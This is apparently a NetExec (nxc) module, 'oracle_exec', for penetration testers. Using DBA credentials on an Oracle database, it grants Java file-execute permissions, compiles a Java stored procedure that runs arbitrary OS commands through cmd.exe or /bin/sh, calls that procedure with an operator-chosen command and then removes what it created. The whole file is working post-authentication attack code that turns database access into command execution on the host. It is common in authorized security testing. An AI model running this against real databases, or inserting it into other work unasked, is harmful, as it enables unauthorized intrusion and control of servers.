from nxc.helpers.misc import CATEGORY


class NXCModule:
    """Execute OS commands on the remote Oracle host via Java stored procedures."""

    name = "oracle_exec"
    description = "Execute OS commands via Oracle Java stored procedures (requires DBA/SYSDBA)"
    supported_protocols = ["oracle"]
    opsec_safe = False
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.cmd = None

    def options(self, context, module_options):
        """CMD    OS command to execute on the remote host"""
        if "CMD" not in module_options:
            context.log.fail("CMD option is required — use -o CMD='<command>'")
            return
        self.cmd = module_options["CMD"]

    def on_admin_login(self, context, connection):
        if not self.cmd:
            context.log.fail("No command specified — use -o CMD='<command>'")
            return

        conn = connection.conn
        log = context.log

        if not self.java_available(conn, log):
            log.fail("Java is not enabled on this Oracle instance — cannot execute OS commands via Java stored procedures")
            return

        try:
            self.grant_java_perms(conn, log)
            self.create_java_source(conn, log)
            self.create_wrapper(conn, log)
            output = self.run_cmd(conn, log)
            if output is not None:
                if output:
                    for line in output.splitlines():
                        log.highlight(line)
                else:
                    log.display("(no output)")
        except Exception as e:
            log.fail(f"Execution error: {e}")
        finally:
            self.cleanup(conn, log)

    def java_available(self, conn, log):
        try:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT count(*) FROM dba_objects "
                "WHERE object_name = 'DBMS_JAVA' AND object_type = 'PACKAGE'"
            )
            row = cursor.fetchone()
            cursor.close()
            return row is not None and row[0] > 0
        except Exception as e:
            log.debug(f"Could not check Java availability: {e}")
            return False

    def grant_java_perms(self, conn, log):
        cursor = conn.cursor()
        cursor.execute("SELECT user FROM dual")
        current_user = cursor.fetchone()[0]
        cursor.close()

        perms = [
            (current_user, "SYS:java.lang.RuntimePermission", "writeFileDescriptor", ""),
            (current_user, "SYS:java.io.FilePermission", "<<ALL FILES>>", "execute"),
        ]
        for grantee, perm, target, action in perms:
            try:
                cursor = conn.cursor()
                cursor.execute(
                    f"BEGIN DBMS_JAVA.grant_permission('{grantee}', '{perm}', '{target}', '{action}'); END;"
                )
                conn.commit()
                cursor.close()
            except Exception as e:
                log.debug(f"Java permission grant ({perm}): {e}")

    def create_java_source(self, conn, log):
        src = (
            'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "NxcOsCmd" AS\n'
            "import java.io.*;\n"
            "public class NxcOsCmd {\n"
            "    public static String exec(String cmd) throws Exception {\n"
            "        String[] shell;\n"
            '        String os = System.getProperty("os.name").toLowerCase();\n'
            '        if (os.contains("windows")) {\n'
            '            shell = new String[]{"cmd.exe", "/c", cmd};\n'
            "        } else {\n"
            '            shell = new String[]{"/bin/sh", "-c", cmd};\n'
            "        }\n"
            "        Process p = Runtime.getRuntime().exec(shell);\n"
            "        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
            "        BufferedReader be = new BufferedReader(new InputStreamReader(p.getErrorStream()));\n"
            "        StringBuilder sb = new StringBuilder();\n"
            "        String line;\n"
            '        while ((line = br.readLine()) != null) sb.append(line).append("\\n");\n'
            '        while ((line = be.readLine()) != null) sb.append("[stderr] ").append(line).append("\\n");\n'
            "        p.waitFor();\n"
            '        if (sb.length() > 32000) return sb.substring(0, 32000) + "... (truncated)";\n'
            "        return sb.toString().trim();\n"
            "    }\n"
            "}"
        )
        cursor = conn.cursor()
        cursor.execute(src)
        conn.commit()
        cursor.close()

    def create_wrapper(self, conn, log):
        wrapper = (
            "CREATE OR REPLACE FUNCTION nxc_oscmd(p_cmd IN VARCHAR2) RETURN VARCHAR2 "
            "AS LANGUAGE JAVA NAME 'NxcOsCmd.exec(java.lang.String) return java.lang.String'"
        )
        cursor = conn.cursor()
        cursor.execute(wrapper)
        conn.commit()
        cursor.close()

    def run_cmd(self, conn, log):
        cursor = conn.cursor()
        output = cursor.callfunc("nxc_oscmd", str, [self.cmd])
        cursor.close()
        return output

    def cleanup(self, conn, log):
        for stmt in ("DROP FUNCTION nxc_oscmd", 'DROP JAVA SOURCE "NxcOsCmd"'):
            try:
                cursor = conn.cursor()
                cursor.execute(stmt)
                conn.commit()
                cursor.close()
            except Exception as e:
                log.debug(f"Cleanup ({stmt[:25]}): {e}")
